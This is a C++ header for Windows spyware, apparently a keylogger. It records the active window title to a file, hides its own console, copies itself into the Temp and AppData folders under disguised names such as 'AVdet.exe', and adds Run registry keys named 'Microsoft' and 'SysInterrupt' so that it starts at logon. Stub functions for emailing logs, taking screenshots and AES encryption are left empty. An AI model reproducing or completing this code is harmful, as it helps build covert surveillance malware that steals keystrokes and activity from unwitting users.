#pragma once
#pragma region DEFINES_AND_INCLUDES

#include <iostream>
#include <Windows.h>
#include <string.h>
#include <string>
#include <fstream>
#include <stdio.h>
#include <WinInet.h>
#include <ctime>
#include <conio.h>
#include <gdiplus.h>

#pragma comment(lib,"Psapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996)

#define KEY_PRESSED -32767
#define MAX 30
#define TEMP "temp"
#define APPDATA "appdata"
#define APPDATAEXE "AVdet.exe"
#define TEMPEXE "xSys32.exe"

std::string nameKey;
std::string lastWND;
#pragma endregion

std::string getTempPath(_In_ std::string path, _In_opt_ std::string nameExe)
{
	path = getenv(path.c_str());

	if (nameExe.c_str() == NULL)
		path += "\\sysinfo.exe";
	else
		path += "\\" + nameExe;

	return path;
}

void getCurrentWindow(std::ofstream &ref)
{
	char title[1023];
	HWND hwndHandle = GetForegroundWindow();
	GetWindowText(hwndHandle, title, 1023);
	if (lastWND != title) {
		ref << std::endl <<title << std::endl;
		lastWND = title;
	}
	
}

void hideProcess()
{
	HWND hprocess;
	AllocConsole();
	hprocess = FindWindow("ConsoleWindowClass", NULL);
	ShowWindow(hprocess, SW_HIDE);
	SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
}

void addRegKey(_In_ std::string path, _In_ std::string nameSKey)
{
	HKEY regKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",NULL, KEY_SET_VALUE, &regKey);
	RegSetValueEx(regKey, nameSKey.c_str(), 0, REG_SZ, (BYTE*)path.c_str(), strlen(path.c_str())+1);
	RegCloseKey(regKey);
	
}

bool DBJK3(_In_ std::string name_key)
{
	HKEY regKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_QUERY_VALUE, &regKey);
	
	if (RegQueryValueEx(regKey, name_key.c_str(), 0, 0, 0, 0) == ERROR_FILE_NOT_FOUND)
	{RegCloseKey(regKey);
	return 0;
	}
		
	return 1;
}

std::string int2str(_In_ int c)
{
	char buffer[4];
	itoa(c, buffer, 10);
	return std::string(buffer);
}

std::string getExePath()
{
	TCHAR path[MAX_PATH];
	GetModuleFileName(0, path, MAX_PATH);
	return path;
}

void sendEmail()
{
}

std::string init()
{
	std::string pathTemp;
	std::string pathAppData;
	std::string currDir;

	pathTemp = getTempPath(TEMP, TEMPEXE);
	pathAppData = getTempPath(APPDATA, APPDATAEXE);
	currDir = getExePath();

	if(strcmp(getExePath().c_str(), pathTemp.c_str())==0)
	{
		nameKey = "Koltic Company";
		return "Pix.bmp";

	}

	else if (strcmp(getExePath().c_str(), pathAppData.c_str()) == 0)
	{
		nameKey = "Microsoft";
		return "log.png";
	}
	else {
		nameKey = "default";
	}
	CopyFileA(getExePath().c_str(), pathAppData.c_str(), 0);
	CopyFileA(getExePath().c_str(), pathTemp.c_str(), 0);
	addRegKey(pathAppData.c_str(), "Microsoft");
	addRegKey(pathTemp.c_str(), "SysInterrupt");
	return "Projects.jpg";
}

void takeSS(char*PngName)
{

}
void Encrypt_AES256()
{
	
}
